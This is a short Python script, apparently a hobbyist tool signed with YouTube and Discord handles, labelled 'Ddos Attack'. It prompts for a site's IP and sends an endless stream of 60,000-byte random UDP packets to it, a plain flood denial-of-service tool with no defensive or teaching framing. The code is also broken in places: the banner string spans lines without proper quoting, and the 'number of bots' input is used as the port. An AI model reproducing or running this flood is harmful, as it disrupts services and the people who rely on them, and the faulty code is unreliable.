import os
import random
import socket

os.system("sudo apt-get install figlet")
os.system("clear")
os.system("figlet Ddos Attack")
print(" ")
print("
╭━━━╮╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━━━╮╱╱╱╱╱╭╮
┃╭━╮┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰╮╭╮┃╱╱╱╱╭╯╰╮
┃╰━━┳╮╭┳━━┳━┳━━┳╮╭┳━━╮┃┃┃┣━━┳━╋╮╭╋━━┳━━╮
╰━━╮┃┃┃┃╭╮┃╭┫┃━┫╰╯┃┃━┫┃┃┃┃╭╮┃╭╋┫┃┃╭╮┃━━┫
┃╰━╯┃╰╯┃╰╯┃┃┃┃━┫┃┃┃┃━╋╯╰╯┃╰╯┃┃┃┃╰┫╰╯┣━━┃
╰━━━┻━━┫╭━┻╯╰━━┻┻┻┻━━┻━━━┻━━┻╯╰┻━┻━━┻━━╯
╱╱╱╱╱╱╱┃┃
╱╱╱╱╱╱╱╰╯")
print("YouTube: SupremeDoritos")
print("Discord' Sempiller#6316")
print("")
print("")
target_ip = str(input("Site's IP Number -->   "))
print(" ")
try:
    target_port = int(input("Number of bots to send -->   "))
except ValueError:
    print("You've dialed incorrectly !!!")

bytes = random._urandom(60000)

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packega = 0

while True:
    sock.sendto(bytes, (target_ip, target_port))
    packega = packega+1
    print("Bots Send -->  %s" %(packega))
